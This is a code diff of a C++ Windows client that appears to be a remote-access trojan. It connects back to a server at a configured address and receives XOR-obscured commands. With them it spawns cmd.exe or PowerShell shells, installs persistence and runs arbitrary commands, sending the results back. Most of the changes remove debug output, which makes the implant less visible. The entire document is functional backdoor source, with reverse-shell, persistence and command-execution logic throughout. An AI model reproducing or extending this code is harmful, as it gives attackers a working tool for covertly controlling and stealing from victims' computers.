@@ -13,7 +13,7 @@ Connexion::Connexion()
 {
     ;
 } //Constructor
-int Connexion::openConnexion() //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
+int Connexion::openConnexion()
 {     
     Sleep(500);
 
@@ -29,7 +29,7 @@ int Connexion::openConnexion() //https://stackoverflow.com/questions/4993119/red
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
-    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
     //sock_client = socket(AF_INET, SOCK_STREAM, 0);
     cout <<"SOCK CREATE" <<endl;
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
@@ -48,7 +48,6 @@ int Connexion::main(bool is_admin, string path_prog)
 {   
 
     int i=0;
-    char buffer[BUFFER_LEN];
     string command;
     vector <string> result;
 
@@ -59,15 +58,9 @@ int Connexion::main(bool is_admin, string path_prog)
     
     while(true)
     {
-        //len_recv = recv(sock_client,buffer,sizeof(buffer), 0);
-        //command.append(buffer,len_recv); 
-        cout << "IN main client " << endl;
         Sleep(1000);
         
-        command = recvSafe(i); //Recv safe and decrypt xor
-
-        cout << "command in main ---->" << command <<"<------------"<<endl;
-        cout << "command in main ---->" << command.length() <<"<------------"<<endl;
+        command = recvSafe(); //Recv safe and decrypt xor
 
         if(command.find("is_life?") != string::npos)
         {
@@ -83,8 +76,7 @@ int Connexion::main(bool is_admin, string path_prog)
             else if (command.empty())
             {
                 //Connection is down.
-                cout << "NADA" << endl;
-                //Beug ? 
+                ;
             }
             else if(command.substr(0,2)=="cd")
             {
@@ -102,10 +94,10 @@ int Connexion::main(bool is_admin, string path_prog)
             }
             else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
             {   
-                cout << "\n\n\nIN MOD SHELL " << endl;
                 wchar_t prog[20];
                 
                 //test if cmd.exe or powershell.exe
+
                 if(command.substr(16, command.length()) == "cmd.exe")
                 {
                     wcscpy(prog, L"cmd.exe");
@@ -127,24 +119,17 @@ int Connexion::main(bool is_admin, string path_prog)
             else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
             {
                 //In mod persistence.
-                cout << "MOD_PERSISTENCE \n\n\n" << endl;
                 Persistence persistence(is_admin, path_prog);
-                cout <<"STLEN OF  command.substr(23,command.length())" << command.substr(23,command.length()) << endl;
-                
+
                 if(command.substr(23,command.length()) =="default")
                 {
-                    cout << "Default persi" << endl;
+                    //cout << "Default persi" << endl;
                     persistence.main();
-                    cout << "[+] Persi ok " << endl;
                 }
-                cout << "send " << endl;
                 int satt = send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);
-                cout << "LL:" << satt << endl;
-                //FAUX sendSafe("\r\n"); //allows to send a confirmation to the server 
             }
             else
             {
-                cout <<"exec gooo " << endl;
                 result = Exec().executeCommand(command);
                 if(command.substr(0,3) == "[-]")
                 {;} //if error not append path.
@@ -154,16 +139,15 @@ int Connexion::main(bool is_admin, string path_prog)
                 sendSafe(result);
             }
         }
-        cout << "ERASE ALL " << endl;
         command.erase();
         result.clear(); 
         i++;
     }
-//        memset(buffer,0,sizeof(buffer));
-
     return 0;
 }
-string Connexion::recvSafe(int i)
+
+
+string Connexion::recvSafe()
 {//allows you to receive data while managing errors 
     char buffer[BUFFER_LEN];
     string result;
@@ -172,27 +156,19 @@ string Connexion::recvSafe(int i)
 
     int len_recv=recv(sock_client,buffer,sizeof(buffer),0);
 
-    cout << "compteur: " << i <<endl;
-    
     if(len_recv==SOCKET_ERROR)
     {
-        cout <<"error in recvsafe, go to reconnect" <<endl;
         reConnect(); //?
         //return 1;
     }
     else
     {
         result.append(buffer,len_recv);
-        cout << "COmmand: " << result << endl;
-        cout << "strlen command: " << strlen(buffer) << endl;
-        cout << "size command string " << result.size() << endl;
         //command.append(XORData);
         
         if(result.empty())
         {
             //If command empty re connect to server.
-            cout << "[--]empty go to reconnect" <<endl;
-
             reConnect();
             return "";
         }
@@ -211,21 +187,14 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     string end = "\r\n"; //END CONNECTION.
     string request = "";
 
-    cout << "\n\n\n\n"  << endl;
-
-    //nb_d_envoi -= 1; //NOT DELETE !!
-
     if(result_of_command.size() >= 1) 
     {        
         
         for(i=0;i< result_of_command.size(); i++)
         {
-            cout << "Send request..." << endl;
             request = result_of_command[i];
-            cout << "size request..." << request.length() << endl;
             
             send(sock_client, XOREncryption(request).c_str(), request.length(),0);
-            cout << "send okkkkk" << endl;
 
             size_all_result_of_command += request.length();
             Sleep(100);
@@ -241,13 +210,10 @@ Once the function is finished send "\r\n" to signal to the server that the clien
         size_all_result_of_command += request.length();
     }
     
-    cout << "NB ENVOI " << result_of_command.size() << endl;
     cout << size_all_result_of_command << endl;
     
     iResult=send(sock_client,XOREncryption(end).c_str(),2,0); // send end communication.
     checkSend(iResult);
-
-    cout <<"STOP SEND" << endl;
 
 }
 
@@ -258,10 +224,11 @@ void Connexion::checkSend(int &iResult)
     if(iResult == SOCKET_ERROR)
     {
         //cout << "error in sendSafe" << endl;
-        cout << "Error in CheckSend go to reconnect:!" << endl;
         reConnect();
     }
 }
+
+
 void Connexion::closeConnexion()
 {   
     // Can be made into a code system. ex:
@@ -271,43 +238,34 @@ void Connexion::closeConnexion()
     // Test if it should wait after x second (s) to reconnect to the server.
 
     //"Close socket successful.
-    cout << "LAST ERROR: " << WSAGetLastError() << endl; //https://docs.microsoft.com/en-us/windows/win32/winsock/disconnecting-the-client
     closesocket(sock_client);
     WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
-    
-    
 }
+
 
 void Connexion::reConnect()
 {   
     string request;
 
-    cout <<"\n\nRECONECTTTTTT" << endl;
-    cout << "[+] Reconnect to server..." << endl;  
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
 
     openConnexion();
-    
-    cout << "\n\n[+] Send MOD_RECONNECT to server " << endl;
+
     request = ("MOD_RECONNECT" SPLIT  +a_token);
-    cout << "REQ" << request << endl;
 
     sendUltraSafe(sock_client, XOREncryption(request)); //send token
-    cout << "[+] Send tokken to server: "<< a_token  << endl;
 
     sendUltraSafe(sock_client, XOREncryption("\r\n"));
-    cout << "Sendultrasafe sucess !!!" << endl;
-   // system("PAUSE");
-   cout <<"END RECONNECT\n\n" << endl;
-
 }
+
 
 int Connexion::getSocket()
 {
     return sock_client;
 }
+
 
 void Connexion::setToken(string token)
 {
